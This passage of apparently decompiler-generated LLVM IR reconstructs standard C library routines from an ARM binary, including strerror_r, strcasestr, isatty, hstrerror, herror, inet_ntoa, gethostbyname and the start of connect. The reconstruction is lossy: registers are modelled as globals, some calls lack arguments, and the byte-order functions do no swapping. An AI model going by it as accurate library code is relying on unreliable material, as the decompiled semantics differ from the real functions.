  uselistorder label %bb1, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-21 = alloca i32, align 4
  %v3_15c18 = load i32, i32* @r4, align 4
  %v0_15c1c = load i32, i32* @r0, align 4
  %v0_15c28 = load i32, i32* @r1, align 4
  store i32 %v0_15c28, i32* @r7, align 4
  %v0_15c2c = load i32, i32* @r2, align 4
  store i32 %v0_15c2c, i32* @r4, align 4
  %tmp = icmp ult i32 %v0_15c1c, 125
  br i1 %tmp, label %dec_label_pc_15c4c, label %dec_label_pc_15c64

dec_label_pc_15c40:                               ; preds = %dec_label_pc_15c4c
  br i1 %v2_15c58, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_15c40
  %v2_15c44 = add i32 %v1_15c5c, -1
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15c40, %bb
  %v0_15c4c1 = phi i32 [ %v1_15c5c, %dec_label_pc_15c40 ], [ %v2_15c44, %bb ]
  %v1_15c48 = add i32 %storemerge, 1
  br label %dec_label_pc_15c4c

dec_label_pc_15c4c:                               ; preds = %entry, %bb18
  %storemerge = phi i32 [ %v1_15c48, %bb18 ], [ ptrtoint ([8 x i8]* @global_var_24738.1386 to i32), %entry ]
  %v1_15c5c = phi i32 [ %v0_15c4c1, %bb18 ], [ %v0_15c1c, %entry ]
  store i32 %storemerge, i32* @r5, align 4
  %v2_15c4c = icmp eq i32 %v1_15c5c, 0
  %v1_15c50 = inttoptr i32 %storemerge to i8*
  %v2_15c50 = load i8, i8* %v1_15c50, align 1
  %v2_15c58 = icmp eq i8 %v2_15c50, 0
  br i1 %v2_15c4c, label %dec_label_pc_15c58, label %dec_label_pc_15c40

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c4c
  br i1 %v2_15c58, label %dec_label_pc_15c64, label %bb19

bb19:                                             ; preds = %dec_label_pc_15c58
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15c98

dec_label_pc_15c64:                               ; preds = %dec_label_pc_15c58, %entry
  %v3_15c68 = ashr i32 %v0_15c1c, 31
  %v5_15c7c = bitcast i32* %stack_var_-21 to i8*
  %v6_15c7c = call i32 @_uintmaxtostr(i8* %v5_15c7c, i32 %v3_15c68, i32 %v0_15c1c, i32 -10, i32 0)
  %v1_15c80 = add i32 %v6_15c7c, -14
  store i32 %v1_15c80, i32* @r5, align 4
  store i32 %v1_15c80, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_24728.1388 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_15c90 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_15c98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c98

dec_label_pc_15c98:                               ; preds = %bb19, %dec_label_pc_15c64
  %v0_15c98 = phi i32 [ %storemerge, %bb19 ], [ %v0_15c98.pre, %dec_label_pc_15c64 ]
  %v1_15c98 = inttoptr i32 %v0_15c98 to i8*
  %v3_15c9c = call i32 @strlen(i8* %v1_15c98)
  %v0_15ca0 = load i32, i32* @r7, align 4
  %v2_15ca0 = icmp eq i32 %v0_15ca0, 0
  br i1 %v2_15ca0, label %bb20, label %dec_label_pc_15c98._crit_edge

dec_label_pc_15c98._crit_edge:                    ; preds = %dec_label_pc_15c98
  %v1_15cac.pre = load i32, i32* @r4, align 4
  br label %bb21

bb20:                                             ; preds = %dec_label_pc_15c98
  store i32 0, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_15c98._crit_edge, %bb20
  %v1_15cac = phi i32 [ %v1_15cac.pre, %dec_label_pc_15c98._crit_edge ], [ 0, %bb20 ]
  %v1_15ca8 = add i32 %v3_15c9c, 1
  %v3_15cac = icmp uge i32 %v1_15ca8, %v1_15cac
  %v9_15cac = icmp eq i32 %v1_15ca8, %v1_15cac
  %v2_15cb0 = xor i1 %v3_15cac, true
  %v3_15cb0 = or i1 %v9_15cac, %v2_15cb0
  br i1 %v3_15cb0, label %bb22, label %bb23

bb22:                                             ; preds = %bb21
  store i32 %v1_15ca8, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %bb21, %bb22
  %v0_15cc0 = phi i32 [ %v1_15cac, %bb21 ], [ %v1_15ca8, %bb22 ]
  %v2_15cb4 = xor i1 %v9_15cac, true
  %v3_15cb4 = and i1 %v3_15cac, %v2_15cb4
  br i1 %v3_15cb4, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %bb23, %bb24
  %v2_15cb8 = icmp eq i32 %v0_15cc0, 0
  br i1 %v2_15cb8, label %dec_label_pc_15cdc, label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %bb25
  store i32 %v0_15cc0, i32* @r2, align 4
  %v0_15cc4 = load i32, i32* @r5, align 4
  store i32 %v0_15cc4, i32* @r1, align 4
  store i32 %v0_15ca0, i32* @r0, align 4
  %v0_15ccc = call i32 @memcpy()
  %v0_15cd0 = load i32, i32* @r4, align 4
  %v1_15cd0 = load i32, i32* @r7, align 4
  %v2_15cd0 = add i32 %v1_15cd0, %v0_15cd0
  %v3_15cd8 = add i32 %v2_15cd0, -1
  %v4_15cd8 = inttoptr i32 %v3_15cd8 to i8*
  store i8 0, i8* %v4_15cd8, align 1
  br label %dec_label_pc_15cdc

dec_label_pc_15cdc:                               ; preds = %bb25, %dec_label_pc_15cc0
  %v0_15cdc = load i32, i32* %r6.global-to-local, align 4
  %v2_15cdc = icmp eq i32 %v0_15cdc, 0
  br i1 %v2_15cdc, label %dec_label_pc_15cec, label %dec_label_pc_15ce4

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cdc
  %v0_15ce4 = call i32 @__GI___errno_location()
  %v0_15ce8 = load i32, i32* %r6.global-to-local, align 4
  %v2_15ce8 = inttoptr i32 %v0_15ce4 to i32*
  store i32 %v0_15ce8, i32* %v2_15ce8, align 4
  %v0_15cec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15cec

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15cdc, %dec_label_pc_15ce4
  %v0_15cec = phi i32 [ 0, %dec_label_pc_15cdc ], [ %v0_15cec.pre, %dec_label_pc_15ce4 ]
  store i32 %v3_15c18, i32* @r4, align 4
  ret i32 %v0_15cec

; uselistorder directives
  uselistorder i1 %v3_15cac, { 1, 0 }
  uselistorder i32 %v1_15c5c, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15c1c, { 3, 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_15cec, { 1, 0 }
  uselistorder label %dec_label_pc_15cdc, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_15c98, { 1, 0 }
  uselistorder label %dec_label_pc_15c4c, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_15d1817 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_15d18.outer

dec_label_pc_15d18.outer:                         ; preds = %dec_label_pc_15d7c, %entry
  %v0_15d2c.ph = phi i32 [ %v1_15d7c, %dec_label_pc_15d7c ], [ %tmp, %entry ]
  %v2_15d1818 = load i8, i8* %v1_15d1817, align 1
  %v2_15d1c20 = icmp eq i8 %v2_15d1818, 0
  br i1 %v2_15d1c20, label %dec_label_pc_15d2c, label %dec_label_pc_15d34

dec_label_pc_15d2c:                               ; preds = %dec_label_pc_15d18.backedge, %dec_label_pc_15d18.outer
  ret i32 %v0_15d2c.ph

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d18.outer, %dec_label_pc_15d18.backedge
  %v1_15d2426.in = phi i32 [ %v1_15d2426, %dec_label_pc_15d18.backedge ], [ %arg2, %dec_label_pc_15d18.outer ]
  %v2_15d1824 = phi i8 [ %v2_15d18, %dec_label_pc_15d18.backedge ], [ %v2_15d1818, %dec_label_pc_15d18.outer ]
  %v2_15d2025.in.in = phi i8 [ %v2_15d18, %dec_label_pc_15d18.backedge ], [ %v2_15d1818, %dec_label_pc_15d18.outer ]
  %v0_15d4023 = phi i32 [ %v1_15d40, %dec_label_pc_15d18.backedge ], [ %v0_15d2c.ph, %dec_label_pc_15d18.outer ]
  %v1_15d2426 = add i32 %v1_15d2426.in, 1
  %v1_15d34 = inttoptr i32 %v0_15d4023 to i8*
  %v2_15d34 = load i8, i8* %v1_15d34, align 1
  %v9_15d38 = icmp eq i8 %v2_15d1824, %v2_15d34
  %v1_15d40 = add i32 %v0_15d4023, 1
  br i1 %v9_15d38, label %dec_label_pc_15d18.backedge, label %dec_label_pc_15d48

dec_label_pc_15d18.backedge:                      ; preds = %dec_label_pc_15d34, %dec_label_pc_15d48
  %v1_15d18 = inttoptr i32 %v1_15d2426 to i8*
  %v2_15d18 = load i8, i8* %v1_15d18, align 1
  %v2_15d1c = icmp eq i8 %v2_15d18, 0
  br i1 %v2_15d1c, label %dec_label_pc_15d2c, label %dec_label_pc_15d34

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d34
  %v2_15d2025.in = zext i8 %v2_15d2025.in.in to i32
  %v3_15d34 = zext i8 %v2_15d34 to i32
  %v2_15d3c = mul nuw nsw i32 %v3_15d34, 2
  %v2_15d2025 = mul nuw nsw i32 %v2_15d2025.in, 2
  %v2_15d48 = load i32, i32* @global_var_2e434, align 4
  %v2_15d4c = add i32 %v2_15d48, %v2_15d2025
  %v3_15d4c = inttoptr i32 %v2_15d4c to i8*
  %v4_15d4c = load i8, i8* %v3_15d4c, align 1
  %v6_15d4c = zext i8 %v4_15d4c to i32
  %v2_15d50 = add i32 %v2_15d48, %v2_15d3c
  %v3_15d50 = inttoptr i32 %v2_15d50 to i8*
  %v4_15d50 = load i8, i8* %v3_15d50, align 1
  %v6_15d50 = zext i8 %v4_15d50 to i32
  %v1_15d5c = add i32 %v2_15d4c, 1
  %v2_15d5c = inttoptr i32 %v1_15d5c to i8*
  %v3_15d5c = load i8, i8* %v2_15d5c, align 1
  %v4_15d5c = zext i8 %v3_15d5c to i32
  %v1_15d60 = add i32 %v2_15d50, 1
  %v2_15d60 = inttoptr i32 %v1_15d60 to i8*
  %v3_15d60 = load i8, i8* %v2_15d60, align 1
  %v4_15d60 = zext i8 %v3_15d60 to i32
  %v3_15d64 = mul nuw i32 %v6_15d4c, 16777216
  %v3_15d68 = mul nuw i32 %v6_15d50, 16777216
  %v4_15d6c = sdiv i32 %v3_15d64, 65536
  %v5_15d6c = or i32 %v4_15d5c, %v4_15d6c
  %v4_15d70 = sdiv i32 %v3_15d68, 65536
  %v5_15d70 = or i32 %v4_15d60, %v4_15d70
  %v9_15d74 = icmp eq i32 %v5_15d6c, %v5_15d70
  br i1 %v9_15d74, label %dec_label_pc_15d18.backedge, label %dec_label_pc_15d7c

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d48
  %v1_15d7c = add i32 %v0_15d2c.ph, 1
  %v2_15d80 = icmp eq i8 %v2_15d34, 0
  br i1 %v2_15d80, label %dec_label_pc_15d90, label %dec_label_pc_15d18.outer

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d7c
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_15d18, { 2, 1, 0 }
  uselistorder i8 %v2_15d34, { 0, 2, 1 }
  uselistorder i32 %v0_15d4023, { 1, 0 }
  uselistorder i32 %v0_15d2c.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d18.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15d34, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_15da0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_15da0, i32* @r1, align 4
  %v0_15da8 = call i32 @__GI_tcgetattr()
  %v1_15dac = sub i32 1, %v0_15da8
  %v2_15dac = icmp ult i32 %v0_15da8, 2
  br i1 %v2_15dac, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_15db8 = phi i32 [ %v1_15dac, %entry ], [ 0, %bb ]
  ret i32 %v5_15db8

; uselistorder directives
  uselistorder i32 %v0_15da8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_15dbc = load i32, i32* @r4, align 4
  %v6_15dbc = load i32, i32* @r5, align 4
  %v2_15dc0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_15dd0 = load i32, i32* @r0, align 4
  %v3_15dd0 = call i32 @ioctl(i32 %v0_15dd0, i32 21505, i32 %v2_15dc0)
  store i32 %v3_15dd0, i32* %r0.global-to-local, align 4
  store i32 %v3_15dd0, i32* @r5, align 4
  %v2_15dd4 = icmp eq i32 %v3_15dd0, 0
  br i1 %v2_15dd4, label %dec_label_pc_15de0, label %dec_label_pc_15e24

dec_label_pc_15de0:                               ; preds = %entry
  %v4_15dec = zext i8 %tmp to i32
  store i32 %v4_15dec, i32* @ip, align 4
  %v2_15df0 = load i32, i32* %stack_var_-52, align 4
  %v1_15df4 = load i32, i32* @r4, align 4
  %v2_15df4 = add i32 %v1_15df4, 4
  %v3_15df4 = inttoptr i32 %v2_15df4 to i32*
  %v0_15df8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15df8 = load i32, i32* @r4, align 4
  %v2_15df8 = add i32 %v1_15df8, 8
  %v3_15df8 = inttoptr i32 %v2_15df8 to i32*
  store i32 %v0_15df8, i32* %v3_15df8, align 4
  %v0_15dfc = load i32, i32* %r0.global-to-local, align 4
  %v1_15dfc = load i32, i32* @r4, align 4
  %v2_15dfc = add i32 %v1_15dfc, 12
  %v3_15dfc = inttoptr i32 %v2_15dfc to i32*
  store i32 %v0_15dfc, i32* %v3_15dfc, align 4
  %v2_15e00 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_15e00, i32* @r1, align 4
  %v1_15e08 = load i32, i32* @r4, align 4
  %v2_15e08 = inttoptr i32 %v1_15e08 to i32*
  store i32 %v2_15df0, i32* %v2_15e08, align 4
  %v0_15e0c = load i32, i32* @ip, align 4
  %v1_15e0c = trunc i32 %v0_15e0c to i8
  %v2_15e0c = load i32, i32* @r4, align 4
  %v3_15e0c = add i32 %v2_15e0c, 16
  %v4_15e0c = inttoptr i32 %v3_15e0c to i8*
  store i8 %v1_15e0c, i8* %v4_15e0c, align 1
  %v0_15e10 = load i32, i32* @r4, align 4
  %v1_15e10 = add i32 %v0_15e10, 17
  store i32 %v1_15e10, i32* %r0.global-to-local, align 4
  %v4_15e14 = call i32 @__GI_mempcpy(i32 %v1_15e10, i32 %v2_15e00, i32 19, i32 %v2_15df0)
  store i32 %v4_15e14, i32* %r0.global-to-local, align 4
  %v0_15e18 = load i32, i32* @r5, align 4
  store i32 %v0_15e18, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15e20 = inttoptr i32 %v4_15e14 to i8*
  %v3_15e20 = call i32 @__GI_memset(i8* %v2_15e20, i32 %v0_15e18)
  store i32 %v3_15e20, i32* %r0.global-to-local, align 4
  %v0_15e24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15e24

dec_label_pc_15e24:                               ; preds = %entry, %dec_label_pc_15de0
  %v0_15e24 = phi i32 [ %v3_15dd0, %entry ], [ %v0_15e24.pre, %dec_label_pc_15de0 ]
  store i32 %v0_15e24, i32* %r0.global-to-local, align 4
  store i32 %v3_15dbc, i32* @r4, align 4
  store i32 %v6_15dbc, i32* @r5, align 4
  ret i32 %v0_15e24

; uselistorder directives
  uselistorder i32 %v0_15e24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15e24, { 1, 0 }
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15e34 = load i32, i32* @r0, align 4
  ret i32 %v1_15e34
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15e3c = urem i32 %arg1, 65536
  ret i32 %v3_15e3c
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15e44 = load i32, i32* @r0, align 4
  ret i32 %v1_15e44
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15e4c = urem i32 %arg1, 65536
  ret i32 %v3_15e4c
}

define i32 @hstrerror(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_15e54 = icmp ugt i32 %arg1, 3
  %v7_15e54 = icmp eq i32 %arg1, 4
  %v2_15e58 = xor i1 %v2_15e54, true
  %v3_15e58 = or i1 %v7_15e54, %v2_15e58
  br i1 %v3_15e58, label %bb, label %bb4

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v4_15e60 = phi i32 [ %arg3, %entry ], [ ptrtoint ([5 x i8*]* @global_var_2531c.1399 to i32), %bb ]
  %v2_15e5c = xor i1 %v7_15e54, true
  %v3_15e5c = and i1 %v2_15e54, %v2_15e5c
  br i1 %v3_15e5c, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v5_15e60 = phi i32 [ %arg1, %bb4 ], [ ptrtoint ([15 x i8]* @global_var_25308.1401 to i32), %bb5 ]
  br i1 %v3_15e58, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v8_15e60 = mul i32 %v5_15e60, 4
  %v9_15e60 = add i32 %v8_15e60, %v4_15e60
  %v10_15e60 = inttoptr i32 %v9_15e60 to i32*
  %v11_15e60 = load i32, i32* %v10_15e60, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  %v1_15e64 = phi i32 [ %v5_15e60, %bb6 ], [ %v11_15e60, %bb7 ]
  ret i32 %v1_15e64

; uselistorder directives
  uselistorder i1 %v2_15e54, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v3_15e74 = icmp eq i8* %arg1, null
  br i1 %v3_15e74, label %dec_label_pc_15e90, label %dec_label_pc_15e80

dec_label_pc_15e80:                               ; preds = %entry
  %v2_15e80 = load i8, i8* %arg1, align 1
  %v2_15e84 = icmp eq i8 %v2_15e80, 0
  br i1 %v2_15e84, label %dec_label_pc_15e90, label %dec_label_pc_15e94

dec_label_pc_15e90:                               ; preds = %dec_label_pc_15e80, %entry
  br label %dec_label_pc_15e94

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e80, %dec_label_pc_15e90
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_2531a.1405 to i32), %dec_label_pc_15e90 ], [ ptrtoint ([3 x i8]* @global_var_25318.1403 to i32), %dec_label_pc_15e80 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_15e94 = call i32 @__GI___h_errno_location()
  %v1_15e98 = inttoptr i32 %v0_15e94 to i32*
  %v2_15e98 = load i32, i32* %v1_15e98, align 4
  %v2_15e9c = icmp ugt i32 %v2_15e98, 3
  %v7_15e9c = icmp eq i32 %v2_15e98, 4
  %v2_15ea0 = xor i1 %v2_15e9c, true
  %v3_15ea0 = or i1 %v7_15e9c, %v2_15ea0
  br i1 %v3_15ea0, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_15e94
  %v6_15ea4 = and i32 %v2_15e98, 1073741824
  %v7_15ea4 = icmp ne i32 %v6_15ea4, 0
  %v8_15ea4 = mul i32 %v2_15e98, 4
  %v9_15ea4 = add i32 %v8_15ea4, ptrtoint ([5 x i8*]* @global_var_2531c.1399 to i32)
  %v10_15ea4 = inttoptr i32 %v9_15ea4 to i32*
  %v11_15ea4 = load i32, i32* %v10_15ea4, align 4
  store i32 %v11_15ea4, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15e94, %bb9
  %v0_15eac = phi i1 [ %v7_15ea4, %bb9 ], [ %v2_15e9c, %dec_label_pc_15e94 ]
  %v2_15eac = xor i1 %v7_15e9c, true
  %v3_15eac = and i1 %v0_15eac, %v2_15eac
  br i1 %v3_15eac, label %bb10, label %._crit_edge

._crit_edge:                                      ; preds = %.thread3
  %v0_15ec0.pre = load i32, i32* @ip, align 4
  br label %bb11

bb10:                                             ; preds = %.thread3
  br label %bb11

bb11:                                             ; preds = %._crit_edge, %bb10
  %v0_15ec0 = phi i32 [ %v0_15ec0.pre, %._crit_edge ], [ ptrtoint ([15 x i8]* @global_var_25308.1401 to i32), %bb10 ]
  %v2_15eb0 = load i32, i32* @global_var_2e1f8, align 4
  store i32 %v2_15eb0, i32* @r0, align 4
  %v0_15eb4 = load i32, i32* @r4, align 4
  %v0_15eb8 = load i32, i32* @r5, align 4
  %v9_15ec4 = call i32 @fprintf(i32 %v2_15eb0, i32 ptrtoint ([8 x i8]* @global_var_25294.1410 to i32), i32 %v0_15eb4, i32 %v0_15eb8, i32 %v0_15ec0)
  ret i32 %v9_15ec4

; uselistorder directives
  uselistorder i1 %v2_15e9c, { 1, 0 }
  uselistorder i32 %v2_15e98, { 1, 0, 2, 3 }
  uselistorder label %bb11, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15e94, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_15ee8 = load i32, i32* @r4, align 4
  %v6_15ee8 = load i32, i32* @r5, align 4
  %v9_15ee8 = load i32, i32* @r6, align 4
  %v12_15ee8 = load i32, i32* @r7, align 4
  %v15_15ee8 = load i32, i32* @r8, align 4
  %v18_15ee8 = load i32, i32* @sb, align 4
  %v21_15ee8 = load i32, i32* @sl, align 4
  %v0_15ef4 = load i32, i32* @r1, align 4
  %v1_15ef4 = add i32 %v0_15ef4, 15
  store i32 %v1_15ef4, i32* %ip.global-to-local, align 4
  %v0_15ef8 = load i32, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r8, align 4
  store i32 0, i32* @sb, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_15f2c

dec_label_pc_15f14:                               ; preds = %dec_label_pc_15f2c
  %v2_15f30 = and i32 %v0_15f30, %v0_15f40
  %v0_15f14 = load i32, i32* @sb, align 4
  %v5_15f18 = inttoptr i32 %v0_15f4c to i8*
  %v6_15f18 = call i32 @_uintmaxtostr(i8* %v5_15f18, i32 0, i32 %v2_15f30, i32 -10, i32 %v0_15f14)
  %v0_15f1c = load i32, i32* @r6, align 4
  %v2_15f1c = icmp eq i32 %v0_15f1c, 0
  %v1_15f20 = add i32 %v6_15f18, -1
  store i32 %v1_15f20, i32* %ip.global-to-local, align 4
  br i1 %v2_15f1c, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_15f14
  %v1_15f24 = load i32, i32* @sl, align 4
  %v2_15f24 = trunc i32 %v1_15f24 to i8
  %v4_15f24 = inttoptr i32 %v0_15f1c to i8*
  store i8 %v2_15f24, i8* %v4_15f24, align 1
  %v0_15f28.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_15f14, %bb
  %v0_15f28 = phi i32 [ %v1_15f20, %dec_label_pc_15f14 ], [ %v0_15f28.pre, %bb ]
  store i32 %v0_15f28, i32* @r6, align 4
  %v0_15f2c.pre = load i32, i32* @r5, align 4
  %v0_15f30.pre = load i32, i32* @r8, align 4
  %v1_15f30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f2c

dec_label_pc_15f2c:                               ; preds = %entry, %bb15
  %v0_15f4c = phi i32 [ %v1_15ef4, %entry ], [ %v0_15f28, %bb15 ]
  %v0_15f40 = phi i32 [ %v0_15ef8, %entry ], [ %v1_15f30.pre, %bb15 ]
  %v0_15f30 = phi i32 [ 255, %entry ], [ %v0_15f30.pre, %bb15 ]
  %v0_15f44 = phi i32 [ 0, %entry ], [ %v0_15f2c.pre, %bb15 ]
  %v7_15f2c = icmp eq i32 %v0_15f44, 3
  store i1 %v7_15f2c, i1* @cpsr_z, align 1
  %v3_15f40 = udiv i32 %v0_15f40, 256
  store i32 %v3_15f40, i32* @r4, align 4
  %v1_15f44 = add i32 %v0_15f44, 1
  store i32 %v1_15f44, i32* @r5, align 4
  %v7_15f48 = icmp sgt i32 %v0_15f44, 3
  br i1 %v7_15f48, label %dec_label_pc_15f4c, label %dec_label_pc_15f14

dec_label_pc_15f4c:                               ; preds = %dec_label_pc_15f2c
  %v1_15f4c = add i32 %v0_15f4c, 1
  store i32 %v3_15ee8, i32* @r4, align 4
  store i32 %v6_15ee8, i32* @r5, align 4
  store i32 %v9_15ee8, i32* @r6, align 4
  store i32 %v12_15ee8, i32* @r7, align 4
  store i32 %v15_15ee8, i32* @r8, align 4
  store i32 %v18_15ee8, i32* @sb, align 4
  store i32 %v21_15ee8, i32* @sl, align 4
  ret i32 %v1_15f4c

; uselistorder directives
  uselistorder i32 %v0_15f44, { 2, 0, 1 }
  uselistorder i32 %v0_15f28, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder i32 -10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15f2c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_34490.1412 to i32), i32* @r1, align 4
  %v0_15f5c = call i32 @__GI_inet_ntoa_r()
  %v0_15f60 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15f60, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15f5c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_15f68 = ptrtoint i32* %stack_var_-8 to i32
  %v0_15f70 = load i32, i32* @r0, align 4
  %v2_15f70 = inttoptr i32 %v0_15f70 to i8*
  %v3_15f70 = call i32 @inet_aton(i8* %v2_15f70, i32 %v2_15f68)
  %v2_15f74 = icmp eq i32 %v3_15f70, 0
  %v3_15f78 = load i32, i32* %stack_var_-8, align 4
  %storemerge = select i1 %v2_15f74, i32 -1, i32 %v3_15f78
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_15f8c = call i32 @__GI_gethostbyname2()
  ret i32 %v0_15f8c
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_15f90 = load i32, i32* @r4, align 4
  %v6_15f90 = load i32, i32* @r5, align 4
  %v0_15f98 = load i32, i32* @r0, align 4
  store i32 %v0_15f98, i32* @r5, align 4
  %v0_15f9c = load i32, i32* @r1, align 4
  store i32 %v0_15f9c, i32* @r4, align 4
  %v0_15fa0 = call i32 @__GI___h_errno_location()
  %v0_15fb0 = load i32, i32* @r4, align 4
  %v2_15fb4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_15fb4, i32* @ip, align 4
  %v0_15fb8 = load i32, i32* @r5, align 4
  %v8_15fc8 = call i32 @gethostbyname2_r(i32 %v0_15fb8, i32 %v0_15fb0, i32* nonnull @global_var_34658.1414, i32 ptrtoint (i32* @global_var_344a0.1416 to i32), i32 440, i32 %v2_15fb4, i32 %v0_15fa0)
  %v3_15fcc = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_15f90, i32* @r4, align 4
  store i32 %v6_15f90, i32* @r5, align 4
  ret i32 %v3_15fcc
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15fe0 = load i32, i32* @r4, align 4
  store i32 %v3_15fe0, i32* %stack_var_-8, align 4
  %v5_15fe4 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_15fe4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15fe4, -4095
  br i1 %tmp, label %dec_label_pc_16004, label %dec_label_pc_15ff4

dec_label_pc_15ff4:                               ; preds = %entry
  %v0_15ff4 = call i32 @__GI___errno_location()
  %v0_15ff8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15ff8 = sub i32 0, %v0_15ff8
  %v2_15ffc = inttoptr i32 %v0_15ff4 to i32*
  store i32 %v1_15ff8, i32* %v2_15ffc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16004

